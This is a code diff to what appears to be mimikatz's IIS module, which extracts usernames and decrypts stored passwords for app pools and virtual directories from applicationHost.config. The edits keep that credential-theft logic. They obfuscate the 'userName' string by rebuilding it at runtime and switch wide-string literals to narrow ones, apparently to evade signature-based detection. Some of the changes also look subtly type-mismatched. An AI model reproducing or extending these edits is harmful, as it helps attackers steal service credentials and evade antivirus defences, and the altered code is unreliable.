@@ -6,7 +6,7 @@
 #include "kuhl_m_iis.h"
 
 const KUHL_M_C kuhl_m_c_iis[] = {
-	{kuhl_m_iis_apphost,	L"apphost",		NULL},
+	{kuhl_m_iis_apphost,	"apphost",		NULL},
 };
 
 const KUHL_M kuhl_m_iis = {
@@ -83,7 +83,9 @@ void kuhl_m_iis_apphost_apppool(int argc, wchar_t * argv[], IXMLDOMDocument *pXM
 		LocalFree(gen);
 		if((IXMLDOMNode_selectSingleNode(pNode, L"processModel", &pProcessModelNode) == S_OK) && pProcessModelNode)
 		{
-			if(gen = kull_m_xml_getAttribute(pProcessModelNode, L"userName"))
+			wchar_t userName_token[] = L"XserName";
+			userName_token[0] = L'u';
+			if(gen = kull_m_xml_getAttribute(pProcessModelNode, userName_token))
 			{
 				kprintf(L"  Username: %s\n", gen);
 				LocalFree(gen);
@@ -147,7 +149,9 @@ void kuhl_m_iis_apphost_site(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDo
 														}
 														kprintf(L" )\n");
 
-														if(gen = kull_m_xml_getAttribute(pVdirNode, L"userName"))
+														wchar_t userName_token[] = L"XserName";
+														userName_token[0] = L'u';
+														if(gen = kull_m_xml_getAttribute(pVdirNode, userName_token))
 														{
 															kprintf(L"      Username: %s\n", gen);
 															LocalFree(gen);
@@ -306,7 +310,7 @@ void kuhl_m_iis_apphost_provider_decrypt(int argc, wchar_t * argv[], PCWSTR keyC
 						kprintf(L"  | PVK file  : %s - \'%s\' : ", keyContainerName, pvkName);
 						if(CryptImportKey(hProv, (PBYTE) pvk + sizeof(PVK_FILE_HDR), pvk->cbPvk, 0, 0, &hKey))
 							kprintf(L"OK\n");
-						else PRINT_ERROR_AUTO(L"CryptImportKey (RSA)");
+						else PRINT_ERROR_AUTO_C("CryptImportKey (RSA)");
 					}
 				}
 				if(isLive || hKey)
@@ -317,10 +321,10 @@ void kuhl_m_iis_apphost_provider_decrypt(int argc, wchar_t * argv[], PCWSTR keyC
 						{
 							kprintf(L"  | Password  : %s\n", liveData + sizeof(DWORD) /*CRC32 ? Random ?*/);
 						}
-						else PRINT_ERROR_AUTO(L"CryptDecrypt");
+						else PRINT_ERROR_AUTO_C("CryptDecrypt");
 						CryptDestroyKey(hSessionKey);
 					}
-					else PRINT_ERROR_AUTO(L"CryptImportKey (session)");
+					else PRINT_ERROR_AUTO_C("CryptImportKey (session)");
 				}
 				if(!isLive)
 				{
@@ -331,7 +335,7 @@ void kuhl_m_iis_apphost_provider_decrypt(int argc, wchar_t * argv[], PCWSTR keyC
 				}
 				CryptReleaseContext(hProv, 0);
 			}
-			else PRINT_ERROR_AUTO(L"CryptAcquireContext");
+			else PRINT_ERROR_AUTO_C("CryptAcquireContext");
 			LocalFree(liveData);
 		}
 	}
